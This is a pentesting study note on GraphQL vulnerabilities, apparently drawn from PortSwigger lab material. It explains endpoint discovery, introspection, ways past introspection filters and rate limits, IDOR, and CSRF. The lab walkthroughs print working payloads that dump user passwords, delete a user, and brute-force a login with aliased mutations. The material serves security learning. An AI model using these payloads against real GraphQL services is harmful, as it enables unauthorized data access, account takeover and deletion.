# GraphQL API vulnerabilities

## **Finding GraphQL endpoints**

### **Universal queries**

If`query{__typename}` has been sent to any GraphQL endpoint, it will include the string `{"data": {"__typename": "query"}}` somewhere in its response. This is known as a universal query, and is a useful tool in probing whether a URL corresponds to a GraphQL service.

### Common endpoint names:

When testing for GraphQL endpoints, send universal queries to the following locations: 

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

If these common endpoints don't return a GraphQL response, you could also try appending `/v1` to the path.

<aside>
💡

GraphQL services will often respond to any non-GraphQL request with a "query not present" or similar error. You should bear this in mind when testing for GraphQL endpoints. 

</aside>

### Request methods

It is best practice for production GraphQL endpoints to only accept POST requests that have a content-type of `application/json`, as this helps to protect against CSRF vulnerabilities. However, some endpoints may accept alternative methods, such as GET requests or POST 
requests that use a content-type of `x-www-form-urlencoded`.

If you can't find the GraphQL endpoint by sending POST requests to common endpoints, try resending the universal query using alternative HTTP methods. 

## **Exploiting unsanitized arguments**

If the API uses arguments to access objects directly, it may be vulnerable to access control vulnerabilities. A user could potentially access information they should not have simply by supplying an argument that corresponds to that information. This is sometimes known as an insecure direct object reference (IDOR). 

```graphql
    query {
        product(id: 3) {
            id
            name
            listed
        }
    }
```

## **Discovering schema information**

Piece together information about the underlying schema. 

The best way to do this is to use introspection queries. Introspection is a built-in GraphQL function that enables you to query a server for information about the schema.

Introspection helps you to understand how you can interact with a GraphQL API. It can also disclose potentially sensitive data, such as description fields.

### **Using introspection**

To use introspection to discover schema information, query the `__schema` field. This field is available on the root type of all queries.

### **Probing for introspection**

It is best practice for introspection to be disabled in production environments, but this advice is not always followed.

You can probe for introspection using the following simple query. If introspection is enabled, the response returns the names of all available queries.

```graphql

    #Introspection probe request

    {
        "query": "{__schema{queryType{name}}}"
    }

```

### **Running a full introspection query**

Run a full introspection query against the endpoint so that you can get as much information on the underlying schema as possible.

The example query below returns full details on all queries, mutations, subscriptions, types, and fragments.

```graphql
 #Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }

```

<aside>
💡

If introspection is enabled but the above query doesn't run, try removing the `onOperation`, `onFragment`, and `onField`directives from the query structure. Many endpoints do not accept these directives as part of an introspection query, and you can often have more success with introspection by removing them.
    

</aside>

### **Visualizing introspection results**

Responses to introspection queries can be full of information, but are often very long and hard to process.

You can view relationships between schema entities more easily using a [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer/). This is an online tool that takes the results of an introspection query and produces a visual representation of the returned data, including the relationships between operations and types.

### **Suggestions**

Even if introspection is entirely disabled, you can sometimes use suggestions to glean information on an API's structure. 

Suggestions are a feature of the Apollo GraphQL platform in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable (for example, `There is no entry for 'productInfo'. Did you mean 'productInformation' instead?`).

You can potentially glean useful information from this, as the response is effectively giving away valid parts of the schema. 

[Clairvoyance](https://github.com/nikitastupin/clairvoyance) is a tool that uses suggestions to automatically recover all or part of a 
GraphQL schema, even when introspection is disabled. This makes it significantly less time consuming to piece together information from suggestion responses.

You cannot disable suggestions directly in Apollo. See [this GitHub thread](https://github.com/apollographql/apollo-server/issues/3919#issuecomment-836503305) for a workaround.

## **Bypassing GraphQL introspection defenses**

If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the `__schema` keyword.

When developers disable introspection, they could use a regex to exclude the `__schema` keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.

As such, if the developer has only excluded `__schema{`, then the below introspection query would not be excluded.

```graphql
    #Introspection query with newline

    {
        "query": "query{__schema
        {queryType{name}}}"
    }
```

If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type of `x-www-form-urlencoded`.

The example below shows an introspection probe sent via GET, with URL-encoded parameters. 

```graphql
    # Introspection probe as GET request

    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

## **Bypassing rate limiting using aliases**

Ordinarily, GraphQL objects can't contain multiple properties with the same name. Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request. 

While aliases are intended to limit the number of API calls you need to make, they can also be used to brute force a GraphQL endpoint. 

Many endpoints will have some sort of rate limiter in place to prevent brute force attacks. Some rate limiters work based on the number of HTTP requests received rather than the number of operations performed on the endpoint. Because aliases effectively enable you to send multiple queries in a single HTTP message, they can bypass this restriction.

The simplified example below shows a series of aliased queries checking whether store discount codes are valid. This operation could potentially bypass rate limiting as it is a single HTTP request, even though it could potentially be used to check a vast number of discount codes at once.

```graphql
  #Request with aliased queries

    query isValidDiscount($code: Int) {
        isvalidDiscount(code:$code){
            valid
        }
        isValidDiscount2:isValidDiscount(code:$code){
            valid
        }
        isValidDiscount3:isValidDiscount(code:$code){
            valid
        }
    }
```

## **GraphQL CSRF**

Cross-site request forgery (CSRF) vulnerabilities enable an attacker to induce users to perform actions that they do not intend to perform. This is done by creating a malicious website that forges a cross-domain request to the vulnerable application. 

GraphQL can be used as a vector for CSRF attacks, whereby an attacker creates an exploit that causes a victim's browser to send a malicious query as the victim user. 

### **How do CSRF over GraphQL vulnerabilities arise**

CSRF vulnerabilities can arise where a GraphQL endpoint does not validate the content type of the requests sent to it and no CSRF tokens are implemented. 

POST requests that use a content type of `application/json` are secure against forgery as long as the content type is validated. In this case, an attacker wouldn't be able to make the victim's browser send this request even if the victim were to visit a malicious site.

However, alternative methods such as GET, or any request that has a content type of `x-www-form-urlencoded`, can be sent by a browser and so may leave users vulnerable to attack if the endpoint accepts these requests. Where this is the case, attackers may be able to craft exploits to send malicious requests to the API.

### Labs

[Lab: Accessing private GraphQL posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)

```graphql
# Set **introspection query
# Use**  [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer/). Note the getBlogPost(id:Int!)
# Craft the payload
query getBlogSummaries {
  getBlogPost(id:3) {
    image
    title
    summary
    id
    isPrivate
    postPassword
  }
}
```

[Lab: Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)

```graphql
# Set **introspection query
# Use**  [GraphQL visualizer](http://nathanrandal.com/graphql-visualizer/). Note the getUser(id:Int!)
# Craft the payload
query getBlogSummaries {
  getUser(id:1) {
    id
    username
    password
    }
}
```

[Lab: Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)

```graphql
# GET request to /api trigger a "Query not present" in the response
# Send /api?query=query{__typename} to confirm that this is a GraphQL endpoint
# Observe that introspection is disabled. However adding the new line %0a after the __schema, bypass that restriction
/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+...........
# Save the request to site map - GraphQL > Save GraphQL queries to site map
# Notice deleteOrganizationUser mutation, which takes a user ID as a parameter. 
# Craft the payload to delete user with ID=3
GET /api?query=mutation($input: DeleteOrganizationUserInput) {
  deleteOrganizationUser(input: $input) {
    user {
      id
      username
    }
  }
}&variables={"input":{"id":3}}

```

[**Bypassing GraphQL brute force protections**](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)

```graphql
# Set **introspection query**
# Save the request to site map - GraphQL > Save GraphQL queries to site map
# Notice Login mutation, which takes a user/password as a parameter.
mutation($input: LoginInput) {
  login(input: $input) {
    token
    success
  }
}
# Create aliases to bypass rate limit
    mutation {
        bruteforce0:login(input:{password: "123456", username: "carlos"}) {
              token
              success
          }

          bruteforce1:login(input:{password: "password", username: "carlos"}) {
              token
              success
          }

    ...
    } 

```

[Lab: Performing CSRF exploits over GraphQL](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)

```graphql
# Set **introspection query**
# Save the request to site map - GraphQL > Save GraphQL queries to site map
# Notice changeEmail mutation, which takes a email as a parameter.
mutation($input: ChangeEmailInput) {
  changeEmail(input: $input) {
    email
  }
}
# Convert Content-Type from application/json to application/x-www-form-urlencoded and deliver the CSRF PoC payload to the victim.
```